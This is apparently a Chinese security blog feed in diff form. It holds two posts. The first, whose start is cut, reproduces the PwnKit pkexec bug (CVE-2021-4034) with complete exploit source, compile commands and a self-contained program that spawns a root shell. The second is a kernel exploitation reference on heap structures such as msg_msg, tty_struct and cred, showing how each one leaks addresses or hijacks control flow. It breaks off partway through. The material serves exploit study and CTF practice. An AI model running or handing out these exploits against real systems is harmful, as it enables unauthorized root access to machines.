+<p>我们看 <code>validate_environment_variable</code> 函数，如果 <code>SHELL</code> 变量检查不通过，就调用 <code>g_printerr</code> 函数</p>
+<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/bDryeU"><img src="https://s1.ax1x.com/2022/03/06/bDryeU.png" alt="bDryeU.png" loading="lazy"></a></figure>
+<p>由于此时环境变量CHARSET的值是 <code>PWNKIT</code> ，因为当 <code>CHARSET</code> 中的值不为 <code>UTF-8</code> 时 <code>g_printerr</code> 函数就会调用 <code>iconv_open</code> 函数去转换编码， <code>iconv_open</code> 函数就有根据环境变量 <code>GCONV_PATH</code> 来查找路径，此时 <code>GCONV_PATH=./pwnkit.so:.</code> ，就会去寻找 <code>gconv-modules</code> 文件，去寻找该文件里面的 .so 文件，这里我们伪造一个 <code>gconv-modules</code> 文件和 <code>pwnkit.c</code> 文件，再将 <code>pwnkit.c</code> 文件编译成 .so 文件，然后我们创建 <code>GCONV_PATH\=.</code> 文件夹，将 <code>pwnkit.so</code> 文件复制到 <code>GCONV_PATH\=.</code>  文件夹下并命名为 <code>pwnkit.so:.</code> ，这时恶意的 .so 文件的路径就是 <code>GCONV_PATH\=./pwnkit.so:.</code> 了，就会调用 .so 文件内的恶意代码了</p>
+<h1 id="复现">复现</h1>
+<p>这里我们以 0x105 版本的 pkexec 为例子</p>
+<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/bD6dWd"><img src="https://s1.ax1x.com/2022/03/06/bD6dWd.png" alt="bD6dWd.png" loading="lazy"></a></figure>
+<p>我们首先创建一个测试文件夹，并将该 pkexec 文件复制到该文件夹下，为了模拟真实情况，我们把该文件的用户和组都改为root(<code>sudo chown root:root pkexec</code>)，然后让其他用户执行文件时，具有与所有者相当的权限(<code>sudo chmod 4755 pkexec</code>)</p>
+<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/bD6qkF"><img src="https://s1.ax1x.com/2022/03/06/bD6qkF.png" alt="bD6qkF.png" loading="lazy"></a></figure>
+<p>现在我们创建我们的exp.c文件和pwnkit.c文件</p>
+<pre><code class="language-c">//exp.c
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv)
+{
+	char * const args[] = {
+		NULL
+	};
+	char * const environ[] = {
+		&quot;pwnkit.so:.&quot;,
+		&quot;PATH=GCONV_PATH=.&quot;,
+		&quot;SHELL=BOY&quot;,
+		&quot;CHARSET=PWNKIT&quot;,
+		NULL
+	};
+	return execve(&quot;./pkexec&quot;, args, environ);
+}
+</code></pre>
+<pre><code class="language-c">//pwnkit.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void gconv(void) {
+}
+
+void gconv_initgconv_init(void *step)
+{
+        char * const args[] = { &quot;/bin/sh&quot;, NULL };
+        char * const environ[] = { &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin&quot;, NULL };
+        setuid(0);
+        setgid(0);
+        execve(args[0], args, environ);
+        exit(0);
+}	//执行gconv_init函数就可以产生一个shell
+</code></pre>
+<p>然后我们编译这两个程序</p>
+<p><code>gcc exp.c -o exp</code></p>
+<p><code>gcc pwnkit.c -o pwnkit.so --shared -fPIE</code></p>
+<p>我们还需要一个 gconv-modules 去存放 .so 文件的路径信息</p>
+<p><code>echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</code></p>
+<p>然后我们创建 <code>GCONV_PATH=.</code> 文件夹，并将当前目录下的 <code>pwnkit.so</code> 文件复制到 <code>GCONV_PATH=.</code> 改名为 <code>pwnkit.so:.</code> ，</p>
+<p>这是我们运行 exp 就可以提权到 root 用户了</p>
+<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/bDgg2j"><img src="https://s1.ax1x.com/2022/03/06/bDgg2j.png" alt="bDgg2j.png" loading="lazy"></a></figure>
+<p>这里我把网上的exp稍微改了一下，该exp最下面一行的 <code>execve(&quot;../pkexec&quot;, (char*[]){NULL}, env);</code> 的 <code>../pkexec</code> 根据情况，因为我的这个有漏洞的 <code>pkexec</code> 在上一个目录下</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+char *shell =
+        &quot;#include &lt;stdio.h&gt;\n&quot;
+        &quot;#include &lt;stdlib.h&gt;\n&quot;
+        &quot;#include &lt;unistd.h&gt;\n\n&quot;
+        &quot;void gconv() {}\n&quot;
+        &quot;void gconv_init() {\n&quot;
+        &quot;       setuid(0); setgid(0);\n&quot;
+        &quot;       seteuid(0); setegid(0);\n&quot;
+        &quot;       system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; /bin/sh\&quot;);\n&quot;
+        &quot;       exit(0);\n&quot;
+        &quot;}&quot;;
+
+int main(int argc, char *argv[]) {
+        FILE *fp;
+        system(&quot;mkdir GCONV_PATH=.&quot;);
+        system(&quot;touch pwnkit.c&quot;);
+        fp = fopen(&quot;pwnkit.c&quot;, &quot;w&quot;);
+        fprintf(fp, &quot;%s&quot;, shell);
+        fclose(fp);
+        system(&quot;gcc pwnkit.c -o pwnkit.so --shared -fPIC&quot;);
+        system(&quot;echo 'module UTF-8// PWNKIT// pwnkit 1' &gt; gconv-modules&quot;);
+        system(&quot;cp pwnkit.so GCONV_PATH=./pwnkit.so:.&quot;);
+        char *env[] = { &quot;pwnkit.so:.&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=BOY&quot;, NULL };
+        execve(&quot;../pkexec&quot;, (char*[]){NULL}, env);
+}
+</code></pre>
+<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/bD4PKJ"><img src="https://s1.ax1x.com/2022/03/06/bD4PKJ.png" alt="bD4PKJ.png" loading="lazy"></a></figure>
+<p>这里的clean程序就是清除，这些生成的文件，方便下一次复现</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(){
+        system(&quot;rm gconv-modules&quot;);
+        system(&quot;rm -r GCONV_PATH=.&quot;);
+        system(&quot;rm pwnkit*&quot;);
+        printf(&quot;clean!!!\n&quot;);
+}
+</code></pre>
+<p>参考文章</p>
+<p>https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</p>
+<p>https://mp.weixin.qq.com/s/HJP-tnCwnVx_gX24u7xzVg</p>
+<p>https://www.whitesourcesoftware.com/resources/blog/polkit-pkexec-vulnerability-cve-2021-4034/</p>
+<p>https://xz.aliyun.com/t/10870#%20toc-3</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[kernle_struct]]></title>
+        <id>https://boycc123.github.io/post/kernle_struct/</id>
+        <link href="https://boycc123.github.io/post/kernle_struct/">
+        </link>
+        <updated>2023-01-01T12:37:38.000Z</updated>
+        <content type="html"><![CDATA[<table>
+<thead>
+<tr>
+<th>name</th>
+<th>size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>shm_file_data</td>
+<td>0x20 kmalloc-32</td>
+</tr>
+<tr>
+<td>seq_operations</td>
+<td>0x20 kmalloc-32</td>
+</tr>
+<tr>
+<td>msg_msg</td>
+<td>0x30 - 0x1000</td>
+</tr>
+<tr>
+<td>ldt_struct</td>
+<td>0x10 kmalloc-16(slub) kmalloc-32(slab)</td>
+</tr>
+<tr>
+<td>tty_struct</td>
+<td>0x2e0 kmalloc-1024</td>
+</tr>
+<tr>
+<td>subprocess_info</td>
+<td>0x60 kmalloc-128</td>
+</tr>
+<tr>
+<td>cred</td>
+<td>0xa8 kmalloc-192</td>
+</tr>
+<tr>
+<td>file</td>
+<td>0xe8 kmalloc-256</td>
+</tr>
+<tr>
+<td>timerfd_ctx</td>
+<td>kmalloc-256</td>
+</tr>
+<tr>
+<td>pipe_buffer</td>
+<td>kmalloc-1024</td>
+</tr>
+<tr>
+<td>packet_socket</td>
+<td>kmalloc-2048</td>
+</tr>
+<tr>
+<td>sk_buff</td>
+<td>kmalloc-2048</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="1shm_file_data">1.shm_file_data</h1>
+<pre><code class="language-c">struct shm_file_data {
+	int id;
+	struct ipc_namespace *ns;
+	struct file *file;
+	const struct vm_operations_struct *vm_ops;
+};
+</code></pre>
+<h2 id="size">size:</h2>
+<p>0x20 kmalloc-32</p>
+<h2 id="利用">利用：</h2>
+<pre><code class="language-c">#include &lt;sys/ipc.h&gt;
+#include &lt;sys/shm.h&gt;
+int shmid = shmget(IPC_PRIVATE, 1023, IPC_CREAT | 0600);    
+char *shmaddr = (char *)shmat( shmid, NULL, 0); // 会创建0x20的chunk
+
+// 通过shmat系统调用会走到do_shmat()函数
+long do_shmat(int shmid, char __user *shmaddr, int shmflg,
+	      ulong *raddr, unsigned long shmlba)
+{
+	...
+	sfd = kzalloc(sizeof(*sfd), GFP_KERNEL); // 创建 0x20 的chunk
+	...
+}
+</code></pre>
+<p>该结构体的 ns 和 vm_ops 指针均可泄露内核基址</p>
+<p>该结构体的 file 指针指向堆区，可以泄露堆地址</p>
+<h1 id="2seq_operation">2.seq_operation</h1>
+<pre><code class="language-c">struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
+</code></pre>
+<h2 id="size-2">size:</h2>
+<p>0x20 kmalloc-32</p>
+<h2 id="利用-2">利用：</h2>
+<pre><code class="language-c">// 通过打开 /proc/self/stat 文件来创建一个 seq_operations 结构体
+int fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);
+// 在打开 /proc/self/stat 文件内核会执行 stat_open -&gt; single_open_size -&gt; single_open
+int single_open(struct file *file, int (*show)(struct seq_file *, void *),
+		void *data)
+{
+	struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT); // 创建0x20大小的chunk
+	int res = -ENOMEM;
+
+	if (op) {
+		op-&gt;start = single_start;
+		op-&gt;next = single_next;
+		op-&gt;stop = single_stop;
+		op-&gt;show = show;
+		res = seq_open(file, op);
+		if (!res)
+			((struct seq_file *)file-&gt;private_data)-&gt;private = data;
+		else
+			kfree(op);
+	}
+	return res;
+}
+EXPORT_SYMBOL(single_open);
+</code></pre>
+<p>该结构体的四个指针均可泄露出内核基址</p>
+<p>可以通过覆盖start指针，然后当我们调用 read 来读取该打开的stat文件，会调用start指针，控制 rip</p>
+<h1 id="3msg_msg">3.msg_msg</h1>
+<pre><code class="language-c">struct msg_msg {
+	struct list_head m_list;
+	long m_type;
+	size_t m_ts;		/* message text size */
+	struct msg_msgseg *next;
+	void *security;
+	/* the actual message follows immediately */
+};
+
+struct msg_msgseg {
+	struct msg_msgseg *next;
+	/* the next part of the message follows immediately */
+};
+</code></pre>
+<h2 id="size-3">size:</h2>
+<p>0x31-0x1000 kmalloc-64以上</p>
+<h2 id="利用-3">利用：</h2>
+<pre><code class="language-c">// 主要依靠 msgsnd() 和 msgrcv()
+int msgget (key_t key, int msgflg);
+int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg);
+ssize_t msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp,int msgflg);
+</code></pre>
+<ul>
+<li>msqid 消息队列标识符</li>
+<li>msgp 发送给队列的消息，是一个结构体，第一个字段是long类型</li>
+<li>msgsz 消息的大小</li>
+<li>msgflg 标志位</li>
+<li>msgtyp 0表示接受第一个消息，大于0接受类型等于msgtyp的第一个消息，小于0接受类型等于或小于msgtyp绝对值的第一个消息</li>
+</ul>
+<pre><code class="language-c">// 首先用msgget分配一些 msqid 然后msgsnd用来分配chunk
+// msgsnd 会调用到 do_msgsnd -&gt; load_msg -&gt; alloc_msg 最后通过alloc_msg来分配chunk
+static long do_msgsnd(int msqid, long mtype, void __user *mtext,
+		size_t msgsz, int msgflg)
+{
+	// ...
+
+	msg = load_msg(mtext, msgsz);	// 分配msg对象
+	if (IS_ERR(msg))
+		return PTR_ERR(msg);
+
+	msg-&gt;m_type = mtype;
+	msg-&gt;m_ts = msgsz;
+    // ...
+}
+
+struct msg_msg *load_msg(const void __user *src, size_t len)
+{
+	struct msg_msg *msg;
+	struct msg_msgseg *seg;
+	int err = -EFAULT;
+	size_t alen;
+
+	msg = alloc_msg(len);	// 分配msg对象
+	if (msg == NULL)
+		return ERR_PTR(-ENOMEM);
+
+	alen = min(len, DATALEN_MSG);
+	if (copy_from_user(msg + 1, src, alen))	// 把数据从用户态拷贝到刚刚分配的chunk中
+		goto out_err;
+
+	for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) {	// 根据msg结构体的next找到分配的msg_msgseg结构体，然后将用户态数据拷贝过去
+        // 这里可以利用userfault卡住，然后篡改next指针来实现任意地址写
+		len -= alen;
+		src = (char __user *)src + alen;
+		alen = min(len, DATALEN_SEG);
+		if (copy_from_user(seg + 1, src, alen))
+			goto out_err;
+	}
+
+	err = security_msg_msg_alloc(msg);
+	if (err)
+		goto out_err;
+
+	return msg;
+
+out_err:
+	free_msg(msg);
+	return ERR_PTR(err);
+}
+
+static struct msg_msg *alloc_msg(size_t len)
+{
+	struct msg_msg *msg;
+	struct msg_msgseg **pseg;
+	size_t alen;
+
+	alen = min(len, DATALEN_MSG);
+	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); // 先分配一个msg_msg结构体
+	if (msg == NULL)
+		return NULL;
+
+	msg-&gt;next = NULL;
+	msg-&gt;security = NULL;
+
+	len -= alen;
+	pseg = &amp;msg-&gt;next;
+	while (len &gt; 0) {
+		struct msg_msgseg *seg;
+
+		cond_resched();
+
+		alen = min(len, DATALEN_SEG);
+		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);	// 然后根据剩下的大小分配 msg_msgseg 结构体
+		if (seg == NULL)
+			goto out_err;
+		*pseg = seg;
+		seg-&gt;next = NULL;
+		pseg = &amp;seg-&gt;next;
+		len -= alen;
+	}
+
+	return msg;
+
+out_err:
+	free_msg(msg);
+	return NULL;
+}
+// msgrcv 会走到 do_msgrcv
+static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
+	       long (*msg_handler)(void __user *, struct msg_msg *, size_t))
+{
+    // 这里 msg_handler 指向 do_msg_fill() 函数
+	// ....
+
+		msg = find_msg(msq, &amp;msgtyp, mode);	// 通过 find_msg 来定位消息
+		if (!IS_ERR(msg)) {
+			/*
+			 * Found a suitable message.
+			 * Unlink it from the queue.
+			 */
+			if ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) {
+				msg = ERR_PTR(-E2BIG);
+				goto out_unlock0;
+			}
+			/*
+			 * If we are copying, then do not unlink message and do
+			 * not update queue parameters.
+			 */
+			if (msgflg &amp; MSG_COPY) {	// 如果设置了 msg_copy 标志就跳到 out_unlock0 不进行下面的unlink
+				msg = copy_msg(msg, copy);
+				goto out_unlock0;
+			}
+
+			list_del(&amp;msg-&gt;m_list);
+			// ....
+	bufsz = msg_handler(buf, msg, bufsz);	// 调用 do_msg_fill() 将数据拷贝回用户态
+	free_msg(msg);	// 释放消息
+
+	return bufsz;
+}
+
+static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz)
+{
+	struct msgbuf __user *msgp = dest;
+	size_t msgsz;
+
+	if (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))
+		return -EFAULT;
+
+	msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;
+	if (store_msg(msgp-&gt;mtext, msg, msgsz)) // 将msg拷贝回用户态
+		return -EFAULT;
+	return msgsz;
+}
+
+int store_msg(void __user *dest, struct msg_msg *msg, size_t len)
+{
+	size_t alen;
+	struct msg_msgseg *seg;
+
+	alen = min(len, DATALEN_MSG);
+	if (copy_to_user(dest, msg + 1, alen))	// 先将msg结构体的内容拷贝回用户态
+		return -1;
+
+	for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) {
+		len -= alen;
+		dest = (char __user *)dest + alen;
+		alen = min(len, DATALEN_SEG);
+		if (copy_to_user(dest, seg + 1, alen))	// 然后将msg结构体的next指针指向的msg_msgseg结构体数据拷贝回用户态
+			return -1;
+	}
+	return 0;
+}
+</code></pre>
+<p>next指向前一个消息，可以泄露heap</p>
+<p>可以通过篡改msg_msg结构体的m_ts大小，然后在msgrcv的时候实现越界读取</p>
+<p>可以通过篡改msg_msg结构体的next指针，然后再msgrcv实现任意地址读取</p>
+<p>通过在msgsnd的时候userfault卡住，然后篡改next指针来实现任意地址写</p>
+<h1 id="4ldt_struct">4.ldt_struct</h1>
+<pre><code class="language-c">struct ldt_struct {
+    struct desc_struct    *entries;
+    unsigned int        nr_entries;
+    int            slot;
+};
+</code></pre>
+<h2 id="size-4">size:</h2>
+<p>0x10 kmalloc-16(slub) kmalloc-32(slab)</p>
+<h2 id="利用-4">利用：</h2>
+<pre><code class="language-c">// 通过modify_ldt 系统调用，然后根据第一个参数来选择要执行的函数
+SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
+        unsigned long , bytecount)
+{
+    int ret = -ENOSYS;
+
+    switch (func) {
+    case 0:
+        ret = read_ldt(ptr, bytecount);	// 第一个参数是0执行read_ldt
+        break;
+    case 1:
+        ret = write_ldt(ptr, bytecount, 1);	// 第一个参数是1执行write_ldt
+        break;
+    case 2:
+        ret = read_default_ldt(ptr, bytecount);
+        break;
+    case 0x11:
+        ret = write_ldt(ptr, bytecount, 0);
+        break;
+    }
+    return (unsigned int)ret;
+}
+</code></pre>
+<p>write_ldt() 函数会调用 alloc_ldt_struct() 函数来分配 ldt_struct 结构体</p>
+<pre><code class="language-c">static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
+{
+
+	// 将用户态的user_desc结构体对象数据拷贝过来，然后经过一系列check
+    // ......
+	new_ldt = alloc_ldt_struct(new_nr_entries);	// 通过 alloc_ldt_struct 分配ldt_strict 结构体chunk
+	if (!new_ldt)
+		goto out_unlock;
+
+	if (old_ldt)
+		memcpy(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE); // 这里可以用竞争的方法来想entries里写入数据
+	// ....
+}
+
+static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
+{
+	// .....
+	new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);	// 分配chunk
+	if (!new_ldt)
+		return NULL;
+	// ....
+}
+</code></pre>
+<p>read_ldt() 函数，控制ldt_struct 的 entries 指针来实现任意地址读取</p>
+<pre><code class="language-c">static int read_ldt(void __user *ptr, unsigned long bytecount)
+{
+	// ....
+	if (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) {	// 将entry里的数据拷贝给用户态
+		retval = -EFAULT;
+		goto out_unlock;
+	}
+	// ....
+}
+// copy_to_user 对于非法地址不会造成kernel panic，会返回一个非0的错误码
+// 在遇到hardened usercopy保护的时候可以利用fork来完成任意地址读取
+</code></pre>
+<h1 id="5tty_struct">5.tty_struct</h1>
+<pre><code class="language-c">struct tty_struct {
+	int	magic;
+	struct kref kref;
+	struct device *dev;
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+	int index;
+
+	/* Protects ldisc changes: Lock tty not pty */
+	struct ld_semaphore ldisc_sem;
+	struct tty_ldisc *ldisc;
+
+	struct mutex atomic_write_lock;
+	struct mutex legacy_mutex;
+	struct mutex throttle_mutex;
+	struct rw_semaphore termios_rwsem;
+	struct mutex winsize_mutex;
+	spinlock_t ctrl_lock;
+	spinlock_t flow_lock;
+	/* Termios values are protected by the termios rwsem */
+	struct ktermios termios, termios_locked;
+	struct termiox *termiox;	/* May be NULL for unsupported */
+	char name[64];
+	struct pid *pgrp;		/* Protected by ctrl lock */
+	struct pid *session;
+	unsigned long flags;
+	int count;
+	struct winsize winsize;		/* winsize_mutex */
+	unsigned long stopped:1,	/* flow_lock */
+		      flow_stopped:1,
+		      unused:BITS_PER_LONG - 2;
+	int hw_stopped;
+	unsigned long ctrl_status:8,	/* ctrl_lock */
+		      packet:1,
+		      unused_ctrl:BITS_PER_LONG - 9;
+	unsigned int receive_room;	/* Bytes free for queue */
+	int flow_change;
+
+	struct tty_struct *link;
+	struct fasync_struct *fasync;
+	wait_queue_head_t write_wait;
+	wait_queue_head_t read_wait;
+	struct work_struct hangup_work;
+	void *disc_data;
+	void *driver_data;
+	spinlock_t files_lock;		/* protects tty_files list */
+	struct list_head tty_files;
+
+#define N_TTY_BUF_SIZE 4096
+
+	int closing;
+	unsigned char *write_buf;
+	int write_cnt;
+	/* If the tty has a pending do_SAK, queue it here - akpm */
+	struct work_struct SAK_work;
+	struct tty_port *port;
+} __randomize_layout;
+</code></pre>
+<h2 id="size-5">size:</h2>
+<p>0x2e0 kmalloc-1024</p>
+<h2 id="利用-5">利用：</h2>
+<pre><code class="language-c">// 通过打开 /dev/ptmx 来分配该结构体
+open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);
+// 要能正常打开 dev/ptmx 文件需要在init脚本里加入下面几句
+// mkdir -p /dev/pts
+// mount -vt devpts -o gid=4,mode=620 none /dev/pts
+
+// 打开 /dev/ptmx 会调用到 ptmx_open() 函数 -&gt; tty_init_dev -&gt; alloc_tty_struct 分配tty_struct
+</code></pre>
+<p>ops指向 ptm_unix98_ops可泄露内核基址</p>
+<p>dev和driver可泄露堆地址</p>
+<p>通过重写ops函数表可以控制RIP</p>
+<p>tty_struct 第一个字段的魔数是0x5401，可以通过该数字锁定结构体</p>
+<pre><code class="language-c">// tty_struct的ops指针对应的 tty_operations结构体
+struct tty_operations {
+    struct tty_struct * (*lookup)(struct tty_driver *driver,
+            struct file *filp, int idx);
+    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+    int  (*open)(struct tty_struct * tty, struct file * filp);
+    void (*close)(struct tty_struct * tty, struct file * filp);
+    void (*shutdown)(struct tty_struct *tty);
+    void (*cleanup)(struct tty_struct *tty);
+    int  (*write)(struct tty_struct * tty,
+              const unsigned char *buf, int count);
+    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+    void (*flush_chars)(struct tty_struct *tty);
+    unsigned int (*write_room)(struct tty_struct *tty);
+    unsigned int (*chars_in_buffer)(struct tty_struct *tty);
+    int  (*ioctl)(struct tty_struct *tty,
+            unsigned int cmd, unsigned long arg);
+    long (*compat_ioctl)(struct tty_struct *tty,
+                 unsigned int cmd, unsigned long arg);
+    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+    void (*throttle)(struct tty_struct * tty);
+    void (*unthrottle)(struct tty_struct * tty);
+    void (*stop)(struct tty_struct *tty);
+    void (*start)(struct tty_struct *tty);
+    void (*hangup)(struct tty_struct *tty);
+    int (*break_ctl)(struct tty_struct *tty, int state);
+    void (*flush_buffer)(struct tty_struct *tty);
+    void (*set_ldisc)(struct tty_struct *tty);
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+    void (*send_xchar)(struct tty_struct *tty, char ch);
+    int (*tiocmget)(struct tty_struct *tty);
+    int (*tiocmset)(struct tty_struct *tty,
+            unsigned int set, unsigned int clear);
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);
+    int (*get_icount)(struct tty_struct *tty,
+                struct serial_icounter_struct *icount);
+    int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
+    int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
+    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
+#ifdef CONFIG_CONSOLE_POLL
+    int (*poll_init)(struct tty_driver *driver, int line, char *options);
+    int (*poll_get_char)(struct tty_driver *driver, int line);
+    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+    int (*proc_show)(struct seq_file *, void *);
+} __randomize_layout;
+</code></pre>
+<h1 id="subprocess_info">subprocess_info</h1>
+<pre><code class="language-c">struct subprocess_info {
+	struct work_struct work;
+	struct completion *complete;
+	const char *path;
+	char **argv;
+	char **envp;
+	struct file *file;
+	int wait;
+	int retval;
+	pid_t pid;
+	int (*init)(struct subprocess_info *info, struct cred *new);
+	void (*cleanup)(struct subprocess_info *info);
+	void *data;
+} __randomize_layout;
+</code></pre>
+<h2 id="size-6">size:</h2>
+<p>0x60 kmalloc-128</p>
+<h2 id="利用-6">利用：</h2>
+<p>work.func可以泄露内核基地址</p>
+<p>重写cleanup可以劫持RIP，不过要通过竞争的方法</p>
+<pre><code class="language-c">// 通过socket(22, AF_INET, 0)可分配一个该堆块
+// 后面又马上会释放掉
+</code></pre>
+<h1 id="cred">cred</h1>
+<pre><code class="language-c">struct cred {
+	atomic_t	usage;
+    
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	atomic_t	subscribers;	/* number of processes subscribed */
+	void		*put_addr;
+	unsigned	magic;
+#define CRED_MAGIC	0x43736564
+#define CRED_MAGIC_DEAD	0x44656144
+#endif
+    
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+	kernel_cap_t	cap_effective;	/* caps we can actually use */
+	kernel_cap_t	cap_bset;	/* capability bounding set */
+	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+    
+#ifdef CONFIG_KEYS
+	unsigned char	jit_keyring;	/* default keyring to attach requested keys to */
+	struct key __rcu *session_keyring; /* keyring inherited over fork */
+	struct key	*process_keyring; /* keyring private to this process */
+	struct key	*thread_keyring; /* keyring private to this thread */
+	struct key	*request_key_auth; /* assumed request_key authority */
+#endif
+    
+#ifdef CONFIG_SECURITY
+	void		*security;	/* subjective LSM security */
+#endif
+    
+	struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
+	
+    /* RCU deletion */
+	union {
+		int non_rcu;			/* Can we skip RCU deletion? */
+		struct rcu_head	rcu;		/* RCU deletion hook */
+	};
+} __randomize_layout;
+</code></pre>
+<h2 id="size-7">size:</h2>
+<p>0xa8 kmalloc-192</p>
+<h2 id="利用-7">利用：</h2>
+<p>通过创建进程来分配该结构体</p>
+<p>可以通过session_keyring字段泄露堆地址</p>
+<p>将uid和gid覆盖为0即可提权</p>
+<h1 id="file">file</h1>
+<pre><code class="language-c">struct file {
+	union {
+		struct llist_node	fu_llist;
+		struct rcu_head 	fu_rcuhead;
+	} f_u;
+	struct path		f_path;
+	struct inode		*f_inode;	/* cached value */
+	const struct file_operations	*f_op;
+
+	/*
+	 * Protects f_ep_links, f_flags.
+	 * Must not be taken from IRQ context.
+	 */
+	spinlock_t		f_lock;
+	enum rw_hint		f_write_hint;
+	atomic_long_t		f_count;
+	unsigned int 		f_flags;
+	fmode_t			f_mode;
+	struct mutex		f_pos_lock;
+	loff_t			f_pos;
+	struct fown_struct	f_owner;
+	const struct cred	*f_cred;
+	struct file_ra_state	f_ra;
+
+	u64			f_version;
+#ifdef CONFIG_SECURITY
+	void			*f_security;
+#endif
+	/* needed for tty driver, and maybe others */
+	void			*private_data;
+
+#ifdef CONFIG_EPOLL
+	/* Used by fs/eventpoll.c to link all the hooks to this file */
+	struct list_head	f_ep_links;
+	struct list_head	f_tfile_llink;
+#endif /* #ifdef CONFIG_EPOLL */
+	struct address_space	*f_mapping;
+	errseq_t		f_wb_err;
+} __randomize_layout
+  __attribute__((aligned(4)));	/* lest something weird decides that 2 is OK */
+</code></pre>
+<h2 id="size-8">size:</h2>
+<p>0xe8 kmalloc-256</p>
+<h2 id="利用-8">利用</h2>
+<p>通过shmget创建共享内存来分配该结构体</p>
+<p>f_op指针可泄露内核基址</p>
+<h1 id="timerfd_ctx">timerfd_ctx</h1>
+<pre><code class="language-c">struct timerfd_ctx {
+	union {
+		struct hrtimer tmr;
+		struct alarm alarm;
+	} t;
+	ktime_t tintv;
+	ktime_t moffs;
+	wait_queue_head_t wqh;
+	u64 ticks;
+	int clockid;
+	short unsigned expired;
+	short unsigned settime_flags;	/* to show in fdinfo */
+	struct rcu_head rcu;
+	struct list_head clist;
+	spinlock_t cancel_lock;
+	bool might_cancel;
+};
+
+struct hrtimer {
+	struct timerqueue_node		node;
+	ktime_t				_softexpires;
+	enum hrtimer_restart		(*function)(struct hrtimer *);
+	struct hrtimer_clock_base	*base;
+	u8				state;
+	u8				is_rel;
+	u8				is_soft;
+};
+</code></pre>
+<h2 id="size-9">size:</h2>
+<p>kmalloc-256</p>
+<h2 id="利用-9">利用：</h2>
+<p>通过timerfd_create()创建</p>
+<p>通过<code>tmr.function</code>所指向的<code>timerfd_tmrproc</code>来泄露内核基址</p>
+<p>通过<code>tmr.base</code>泄露堆地址</p>
+<h1 id="pipe_buffer">pipe_buffer</h1>
+<pre><code class="language-c">struct pipe_buffer {
+	struct page *page;							// 读写pipe时, 实际上是读写page地址
+	unsigned int offset, len;
